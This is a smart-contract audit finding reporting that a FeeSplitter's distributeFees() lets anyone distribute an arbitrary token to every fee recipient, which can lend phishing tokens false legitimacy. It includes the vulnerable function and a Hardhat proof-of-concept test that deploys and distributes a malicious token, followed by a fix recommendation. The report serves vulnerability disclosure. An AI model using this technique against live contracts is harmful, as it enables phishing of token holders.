# Protocol Opens up users to phishing attacks

## Summary
The protocol can be used to transfer arbitrary/malicious tokens to anyone that is set as a fee Recipient in FeeSplitter.sol including the treasury, rewards and user base (based on test values and code comments).

## Vulnerability Detail
Anyone can pass in an arbitrary token address to feeSplitter and have it distribute that token to all of the preset fee Recipients.

1. Make malicious token
2. Either mint to the feeSplitter or transfer in an amount which becomes 'feeAmount'.
3. Call distributeFees() and we call into token to transfer out.
4. Trusted source has now distributed malicious tokens giving them some legitimacy and social proof.

## Impact
Avg user will see a token coming from a trusted source while this source's treasury, reward pool, multisig and other users also hold this token from this same source giving it a form of social proof increasing the likelyhood of a successful fishing attempt.

## Code Snippet
```js
   //@audit - callable by anyone. If I send tokens to this address
   //@audit - I'll be able to transfer tokens to users, treasury and reward pool.
   //@audit - treasury is multisig and rewardpool does not yet exist
    function distributeFees(address _token) external {
        uint256 feeAmount = IERC20(_token).balanceOf(address(this));
        if (feeAmount == 0) return;

        uint256 _numFeeRecipients = numFeeRecipients;
        for (uint256 i; i < _numFeeRecipients; ++i) {
            FeeRecipient memory feeRecipient = feeRecipients[i];
            IERC20(_token).safeTransfer(
                feeRecipient.recipient,
                (feeAmount * feeRecipient.proportion) / Constants.PERCENT_PRECISION
            );
        }
    }
```

POC:
```js
it("It opens users up to phishing attacks", async () => {
      // As seen in the above test one of the recipients is a user. This means that
      // feeSplitter is sending tokens to users as well as Treasury and Reward pool as seen in FeeSplitter.sol comments
      
      await testDai.mint(user.address, initDaiAmount);

      const recipientData = [
        { recipient: deployer.address, proportion: PERCENT_PRECISION.div(4) },
        { recipient: multisig.address, proportion: PERCENT_PRECISION.div(3) },
        { recipient: user.address, proportion: PERCENT_PRECISION.div(6).add(1) },
        { recipient: keeper.address, proportion: PERCENT_PRECISION.div(4) },
      ];
      // Set up 4 recipients
      await feeSplitter.setFeeRecipients(recipientData);

      const mlxFactory = await ethers.getContractFactory("MmockERC20", hacker);
      mlx = (await mlxFactory.deploy("Malicous", "MLX", feeSplitter.address )) as MmockERC20;

      await mlx.deployed();
      await mlx.mint(feeSplitter.address, initDaiAmount);

      await feeSplitter.connect(hacker).distributeFees(mlx.address);
      // At this point the user's MLX has been moved to the user address.      
      
      expect(await mlx.balanceOf(feeSplitter.address)).to.equal(0); // Test passes
      expect(await mlx.balanceOf(deployer.address)).to.be.greaterThan(0); // Test passes
      expect(await mlx.balanceOf(user.address)).to.be.greaterThan(0); // Test passes
      console.log(await testDai.balanceOf(user.address))
      console.log(await mlx.balanceOf(user.address));
    })
```
No need for further exploit POCs as this is enough I believe to demonstrate my point.

Manual Review

## Recommendation

place restrictions on calling this or add a mapping of pre-approved tokens to prevent arb token transfers.
